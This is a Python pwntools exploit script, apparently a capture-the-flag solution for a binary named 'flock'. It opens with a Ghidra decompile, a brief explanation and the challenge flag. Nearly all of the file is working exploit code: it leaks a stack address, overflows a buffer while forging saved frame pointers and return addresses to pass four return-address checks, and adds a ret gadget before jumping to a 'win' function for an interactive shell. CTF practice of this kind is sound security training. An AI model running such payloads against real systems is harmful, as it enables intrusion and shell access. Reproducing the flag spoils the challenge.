#!/usr/bin/env python3


"""
Ghidra decompile

void func5(void)

{
  long unaff_retaddr;
  undefined local_88 [112];
  ssize_t local_18;
  undefined *local_10;
  
  local_10 = local_88;
  printf("<<< Song Begins At %p\n",local_10);
  printf("PwnMe >>> ");
  local_18 = read(0,local_88,500);
  if (unaff_retaddr != 0x401276) {
    fail();
  }
  return;
}

void func4(void)

{
  long unaff_retaddr;
  
  func5();
  if (unaff_retaddr != 0x4012a0) {
    fail();
  }
  return;
}

void func3(void)

{
  long unaff_retaddr;
  
  func4();
  if (unaff_retaddr != 0x4012ca) {
    fail();
  }
  return;
}

void func2(void)

{
  long unaff_retaddr;
  
  func3();
  if (unaff_retaddr != 0x4012f0) {
    fail();
  }
  return;
}

void func1(void)

{
  func2();
  return;
}

This is a basic buffer overflow, but we need to restore the proper return 
addresses to the stack until we get to func1 in which case we can overwrite
the return address with the write to win which will pop a shell.

We also need to do a small rop with a return instruction to align the stack
prior to returning into win.

sun{here_then_there_then_everywhere}
"""

from pwn import *


exe = ELF("./flock")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")

    r.recvuntil(b'At')

    rsp = int(r.recvuntil(b'\n'), 16)

    r.recvuntil(b'>>>')

    log.progress("Got rsp: ", hex(rsp))


    # func5 bypass

    # Fill the current stack buffer
    payload = b'A' * 120
    # Restore stack and base pointers
    payload += p64(rsp)
    payload += p64(rsp+0xa0)
    # Add back the return address
    payload += p64(0x401276)

    # func4 bypass
    rsp = rsp+0xa0
    payload += b'A' * 16
    payload += p64(rsp+0x20)
    payload += p64(0x4012a0)

    # func3 bypass
    rsp = rsp+0x20
    payload += b'A' * 16
    payload += p64(rsp+0x20)
    payload += p64(0x4012ca)

    # func2 bypass
    rsp = rsp+0x20
    payload += b'A' * 16
    payload += p64(rsp+0x20)
    payload += p64(0x4012f0)

    # win
    rop = ROP(exe)
    rsp = rsp+0x20
    payload += p64(rsp+0x10)
    payload += p64(rop.ret.address)
    payload += p64(exe.sym['win'])

    r.send(payload)
    

    r.interactive()


if __name__ == "__main__":
    main()
